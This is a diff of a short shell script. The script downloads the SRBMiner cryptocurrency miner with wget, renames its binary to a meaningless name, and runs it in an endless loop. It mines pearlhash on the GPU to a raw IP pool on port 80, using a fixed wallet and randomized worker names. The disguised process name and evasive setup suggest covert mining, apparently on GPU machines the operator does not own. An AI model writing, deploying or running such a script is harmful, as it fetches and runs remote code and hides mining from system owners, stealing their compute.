@@ -1,9 +1,8 @@
 nvidia-smi
-wget https://github.com/rxt36q6/file/releases/download/1/SRBMiner-Multi-3-5-7-Linux.tar.gz
-tar xf SRBMiner-Multi-3-5-7-Linux.tar.gz
-cd SRBMiner-Multi-3-5-7
-mv SRBMiner-MULTI samsjau
+wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/srbminer-3-5-8/SRBMiner-Multi-3-5-8-Linux.tar.gz
+tar xf SRBMiner-Multi-3-5-8-Linux.tar.gz
+mv SRBMiner-MULTI palsokao
 
 while true; do
-./samsjau --disable-cpu --algorithm pearlhash --pool 212.47.248.156:80 --wallet prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
+./palsokao --disable-cpu --algorithm pearlhash --pool 212.47.248.156:80 --wallet prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
 done
